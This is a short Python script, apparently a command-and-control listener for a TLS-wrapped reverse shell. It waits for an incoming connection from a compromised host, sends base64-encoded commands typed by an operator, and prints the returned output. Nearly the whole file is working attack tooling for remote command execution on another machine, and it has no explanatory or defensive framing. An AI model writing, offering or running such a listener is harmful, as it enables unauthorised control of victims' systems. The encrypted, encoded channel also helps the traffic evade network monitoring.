"""
reverse shell listener - listen for incoming connections and then allow the
                         user to execute commands on the remote host

set the following before using:

LISTENADDRESS - set to the ip of the interface you want to listen on
PORT          - TCP port to listen on
KEYFILE       - path to an openssl PEM RSA private key file
CERTFILE      - path to an openssl PEM certificate file
"""

import base64
import socket
import ssl


LISTENADDRESS = '127.0.0.1'
PORT = 4443
KEYFILE = 'serverkey.pem'
CERTFILE = 'servercert.pem'


def listener(listenaddress, port, key, cert):
    """
    listen for connections from reverse shells

    Args:
        listenaddress(str): the ip address of the interface to listen on
                            use an empty string '' to listen on all available
                            interfaces
        port(int): the TCP port to listen on
        key(str): the path to the ssl keyfile
        cert(str): the path to the ssl certificate
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((listenaddress, port))
    soc = ssl.wrap_socket(
        soc, keyfile=key, certfile=cert, server_side=True,
        ssl_version=ssl.PROTOCOL_TLSv1_2, ciphers='AES256')
    soc.listen(1)
    print('listening for connections')
    conn, addr = soc.accept()
    print('received connection from {}'.format(str(addr)))
    print('"quit" to close connection')
    while True:
        command = input(": ").encode('utf-8')
        if command == b'quit':
            print('closing shell connection')
            break
        encoded = base64.b64encode(command)
        conn.send(encoded)
        cmdoutput = conn.recv(2048)
        decoded = base64.b64decode(cmdoutput)
        print(decoded.decode('utf-8'))
    conn.close()
    soc.close()


if __name__ == '__main__':
    listener(LISTENADDRESS, PORT, KEYFILE, CERTFILE)
